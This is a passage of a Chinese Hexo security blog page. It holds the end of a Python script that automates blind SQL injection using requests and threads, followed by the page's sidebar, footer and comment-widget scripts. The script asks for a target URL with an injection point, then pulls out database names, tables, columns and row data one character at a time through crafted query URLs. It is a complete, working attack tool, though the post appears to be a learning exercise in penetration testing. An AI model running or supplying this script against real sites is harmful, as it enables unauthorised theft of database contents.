class="comment">#对语句进行初始化,并判断我们要查什么</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,len_x+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> id==<span class="string">"schemata"</span>:</span><br><span class="line">                url=self.schemata.format(num=j,match=ord(i))</span><br><span class="line">            <span class="keyword">elif</span> id==<span class="string">"table"</span>:</span><br><span class="line">                url=self.se_tables.format(sch_name=value,num=j,match=ord(i))</span><br><span class="line">            <span class="keyword">elif</span> id == <span class="string">"column"</span>:</span><br><span class="line">                url = self.se_columns.format(table_name=value, num=j, match=ord(i))</span><br><span class="line">            <span class="keyword">elif</span> id==<span class="string">"data"</span>:</span><br><span class="line">                url = self.se_datas.format(num=j, match=ord(i))</span><br><span class="line">            self.judge_all(url,i)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gf_len</span><span class="params">(self,url,j)</span>:</span></span><br><span class="line">        <span class="string">"""再次对获取数据库名sql注入的url初始化，并判断"""</span></span><br><span class="line">        url = url.format(ord(j))</span><br><span class="line">        self.judge_all(url, j)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(self,id=<span class="string">"schema"</span>,value=<span class="string">""</span>)</span>:</span></span><br><span class="line">        <span class="string">"""对获取数据库名sql注入的url赋初始化"""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> id==<span class="string">"schema"</span>:</span><br><span class="line">                url=self.len_sch.format(i)+<span class="string">"&#123;&#125; %23"</span></span><br><span class="line">            <span class="keyword">elif</span> id==<span class="string">"table"</span>:</span><br><span class="line">                url=self.len_tab.format(sch_name=value,leng=i)+<span class="string">"&#123;&#125; %23"</span></span><br><span class="line">            <span class="keyword">elif</span> id==<span class="string">'column'</span>:</span><br><span class="line">                url=self.len_col.format(table_name=value,leng=i)+<span class="string">"&#123;&#125; %23"</span></span><br><span class="line">            <span class="keyword">elif</span> id==<span class="string">"data"</span>:</span><br><span class="line">                url = self.len_da.format(i) + <span class="string">"&#123;&#125; %23"</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.match2:</span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                t1 = threading.Thread(target=self.gf_len, args=(url,j))</span><br><span class="line">                t1.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_schemates</span><span class="params">(self,s_len)</span>:</span></span><br><span class="line">        <span class="string">"""开始获取所有的数据库名字"""</span></span><br><span class="line">        id=<span class="string">"schemata"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.match1:</span><br><span class="line">            t2 = threading.Thread(target=self.process, args=((i,id,s_len,)))  <span class="comment"># 启动了40个线程，要启动几个就循环几次</span></span><br><span class="line">            t2.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_table</span><span class="params">(self,choose,id)</span>:</span></span><br><span class="line">        <span class="string">'''根据不同的值，查询不同的库并判断库里表名长度'''</span></span><br><span class="line">        <span class="keyword">if</span> self.schemates[choose<span class="number">-1</span>]==<span class="string">"information_schema"</span> <span class="keyword">or</span> self.schemates[choose<span class="number">-1</span>]==<span class="string">"mysql"</span> <span class="keyword">or</span> self.schemates[choose<span class="number">-1</span>]==<span class="string">"performance_schema"</span>:</span><br><span class="line">            print(<span class="string">"对不起，这个库暂时不支持查询"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.get_len(id,self.schemates[choose<span class="number">-1</span>])</span><br><span class="line">        <span class="comment"># #等待线程结束</span></span><br><span class="line">        time.sleep(<span class="number">2.5</span>)</span><br><span class="line">        <span class="comment">#取值</span></span><br><span class="line">        len_tab=int(self.content)</span><br><span class="line">        <span class="comment"># #初始化content</span></span><br><span class="line">        self.content=<span class="string">""</span></span><br><span class="line">        print(len_tab)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.match1:</span><br><span class="line">            t3 = threading.Thread(target=self.process, args=((i,id,len_tab,self.schemates[choose<span class="number">-1</span>],)))  <span class="comment"># 启动了40个线程，要启动几个就循环几次</span></span><br><span class="line">            t3.start()</span><br><span class="line">        time.sleep(<span class="number">2.2</span>*len_tab)</span><br><span class="line">        <span class="comment">#将字符转换成数组，方便后期获取</span></span><br><span class="line">        self.tables=self.content.split(<span class="string">","</span>)</span><br><span class="line">        self.tables.append(self.schemates[choose<span class="number">-1</span>])</span><br><span class="line">        self.content=<span class="string">''</span></span><br><span class="line">        print(self.tables)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_column</span><span class="params">(self,choose,id)</span>:</span></span><br><span class="line">        <span class="string">'''根据不同的值，查询不同的库并判断库里表名长度'''</span></span><br><span class="line">        self.get_len(id, self.tables[choose - <span class="number">1</span>])</span><br><span class="line">        <span class="comment"># #等待线程结束</span></span><br><span class="line">        time.sleep(<span class="number">2.5</span>)</span><br><span class="line">        <span class="comment"># 取值</span></span><br><span class="line">        len_col = int(self.content)</span><br><span class="line">        <span class="comment"># #初始化content</span></span><br><span class="line">        self.content = <span class="string">""</span></span><br><span class="line">        print(len_col)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.match1:</span><br><span class="line">            t4 = threading.Thread(target=self.process,args=((i, id, len_col, self.tables[choose - <span class="number">1</span>],)))  <span class="comment"># 启动了40个线程，要启动几个就循环几次</span></span><br><span class="line">            t4.start()</span><br><span class="line">        time.sleep(<span class="number">2.2</span>*len_col)</span><br><span class="line">        <span class="comment"># 将字符转换成数组，方便后期获取</span></span><br><span class="line">        self.columns = self.content.split(<span class="string">","</span>)</span><br><span class="line">        self.columns.append(self.tables[choose - <span class="number">1</span>])</span><br><span class="line">        self.content = <span class="string">''</span></span><br><span class="line">        print(self.columns)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_data</span><span class="params">(self,id)</span>:</span></span><br><span class="line">        <span class="string">"""查询所要查询字段中的所有数据"""</span></span><br><span class="line">        <span class="comment">#补充sql语句</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(self.columns)<span class="number">-1</span>):</span><br><span class="line">            self.len_da+=<span class="string">","</span>+self.columns[i]</span><br><span class="line">            self.se_datas+=<span class="string">","</span>+self.columns[i]</span><br><span class="line"></span><br><span class="line">        self.len_da+=<span class="string">")) from "</span> + self.tables[<span class="number">-1</span>]+<span class="string">"."</span>+self.columns[<span class="number">-1</span>] + <span class="string">")),&#123;&#125;,1))="</span></span><br><span class="line">        self.se_datas+=<span class="string">")) from "</span> + self.tables[<span class="number">-1</span>]+<span class="string">"."</span>+self.columns[<span class="number">-1</span>] + <span class="string">"),&#123;num&#125;,1))=&#123;match&#125; %23"</span></span><br><span class="line">        print(self.len_da)</span><br><span class="line">        print(self.se_datas)</span><br><span class="line">        <span class="comment">#获取所有记录的长度</span></span><br><span class="line">        self.get_len(id)</span><br><span class="line">        time.sleep(<span class="number">2.5</span>)</span><br><span class="line">        <span class="comment">#取值</span></span><br><span class="line">        len_da=int(self.content)</span><br><span class="line">        <span class="comment"># #初始化content</span></span><br><span class="line">        self.content=<span class="string">""</span></span><br><span class="line">        print(len_da)</span><br><span class="line">        <span class="comment">#开始遍历</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.match1:</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line">            t5 = threading.Thread(target=self.process,args=((i, id, len_da)))  <span class="comment"># 启动了60个线程，要启动几个就循环几次</span></span><br><span class="line">            t5.start()</span><br><span class="line">        time.sleep(<span class="number">2.2</span>*len_da)</span><br><span class="line">        <span class="comment"># 将字符转换成数组，方便后期获取</span></span><br><span class="line">        self.datas = self.content.split(<span class="string">","</span>)</span><br><span class="line">        self.datas.append(self.columns[<span class="number">-1</span>])</span><br><span class="line">        self.content = <span class="string">''</span></span><br><span class="line">        print(self.datas)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(self,choose,s_len,id)</span>:</span></span><br><span class="line">        <span class="string">'''查询表明，根据不同的选择'''</span></span><br><span class="line">        <span class="keyword">if</span> choose==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> choose&gt;s_len:</span><br><span class="line">            print(<span class="string">"你输入的数字过大"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> id==<span class="string">"table"</span>:</span><br><span class="line">                self.select_table(choose,id)</span><br><span class="line">            <span class="keyword">elif</span> id==<span class="string">"column"</span>:</span><br><span class="line">                self.select_column(choose,id)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''程序运行时候执行本函数'''</span></span><br><span class="line"></span><br><span class="line">        <span class="string">"""1、查询库名的长度"""</span></span><br><span class="line">        self.get_len()</span><br><span class="line">        <span class="comment">#等待线程结束</span></span><br><span class="line">        time.sleep(<span class="number">2.5</span>)</span><br><span class="line">        len_sch=int(self.content)</span><br><span class="line">        <span class="comment">#初始化content</span></span><br><span class="line">        self.content=<span class="string">""</span></span><br><span class="line">        print(len_sch)</span><br><span class="line">        <span class="string">"""2、查询所有库"""</span></span><br><span class="line">        self.get_schemates(len_sch)</span><br><span class="line">        <span class="comment">#计算延时的可能会出现的情况</span></span><br><span class="line">        time.sleep(<span class="number">2.2</span>*len_sch)</span><br><span class="line">        schemates=self.content</span><br><span class="line">        <span class="comment">#将字符转换成数组，方便后期获取</span></span><br><span class="line">        self.schemates=schemates.split(<span class="string">","</span>)</span><br><span class="line">        <span class="comment">#初始化content</span></span><br><span class="line">        self.content=<span class="string">""</span></span><br><span class="line">        print(self.schemates)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(self.schemates)):</span><br><span class="line">            print(<span class="string">"第%d个库名：%s"</span>%(i+<span class="number">1</span>,self.schemates[i]))</span><br><span class="line">        <span class="string">"""3、通过第二步查到的库名查表名"""</span></span><br><span class="line">        choose=int(input(<span class="string">"请输入你需要查询的数据库的编号，如果想查全部请输入0:"</span>))</span><br><span class="line">        self.choose(choose,len(self.schemates),id=<span class="string">"table"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(self.tables) - <span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"%s库的第%d个表名：%s"</span> % (self.tables[<span class="number">-1</span>], i + <span class="number">1</span>, self.tables[i]))</span><br><span class="line">        <span class="string">"""4、通过第三步查到的表名查字段名"""</span></span><br><span class="line">        choose=int(input(<span class="string">"请输入你需要查询的表名的编号，如果想查全部请输入0:"</span>))</span><br><span class="line">        self.choose(choose,len(self.tables)<span class="number">-1</span>,id=<span class="string">"column"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(self.columns) - <span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"%s库%s表中的第%d个字段名：%s"</span> % (self.tables[<span class="number">-1</span>],self.columns[<span class="number">-1</span>], i + <span class="number">1</span>, self.columns[i]))</span><br><span class="line">        <span class="string">"""5、通过第四步拿到最后值"""</span></span><br><span class="line">        self.select_data(id=<span class="string">"data"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="comment">#输入sql注入的地址</span></span><br><span class="line">    print(<span class="string">"温馨提示：添加网址的时候，请带上注入点"</span>)</span><br><span class="line">    sqli_url = input(<span class="string">"请输入需要注入的网址:"</span>)</span><br><span class="line">    sqli=Sqli_Z_P(sqli_url)</span><br><span class="line">    sqli.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/17/%E6%B8%97%E9%80%8F/%E5%88%9D%E8%AF%86%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="prev" title="初识文件包含漏洞">
+      <i class="fa fa-chevron-left"></i> 初识文件包含漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/17/%E6%B8%97%E9%80%8F/%E5%88%9D%E8%AF%86%E8%9A%81%E5%89%91/" rel="next" title="初识蚁剑">
+      初识蚁剑 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于requests库的爬虫"><span class="nav-number">1.</span> <span class="nav-text">基于requests库的爬虫</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码如下："><span class="nav-number">1.1.</span> <span class="nav-text">代码如下：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爬取效果截图："><span class="nav-number">1.2.</span> <span class="nav-text">爬取效果截图：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于requests库的盲注脚本"><span class="nav-number">2.</span> <span class="nav-text">基于requests库的盲注脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#二分式"><span class="nav-number">2.1.</span> <span class="nav-text">二分式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#注入思路"><span class="nav-number">2.1.1.</span> <span class="nav-text">注入思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码实现："><span class="nav-number">2.1.2.</span> <span class="nav-text">代码实现：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用多线程加速"><span class="nav-number">2.2.</span> <span class="nav-text">利用多线程加速</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#注入思路-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">注入思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码实现"><span class="nav-number">2.2.2.</span> <span class="nav-text">代码实现</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="逸晨"
+      src="/images/tx.jpeg">
+  <p class="site-author-name" itemprop="name">逸晨</p>
+  <div class="site-description" itemprop="description">直到这一刻微笑着说话为止，我至少留下了一公升眼泪</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/YiChenNet" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;YiChenNet" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1605732986@qq.com" title="E-Mail → mailto:1605732986@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/6407604695" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;6407604695" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.baidu.com/" title="https:&#x2F;&#x2F;www.baidu.com&#x2F;" rel="noopener" target="_blank">Baidu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com&#x2F;" rel="noopener" target="_blank">Github</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">逸晨</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">117k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:46</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'uJtl3uLuOiFKO26QncHHBcDq-gzGzoHsz',
+      appKey     : 'Ft83hPuo2K0B3aGr0N7CWt5w',
+      placeholder: "留下邮箱，有回复时你将收到提醒，邮箱不会被公开。",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
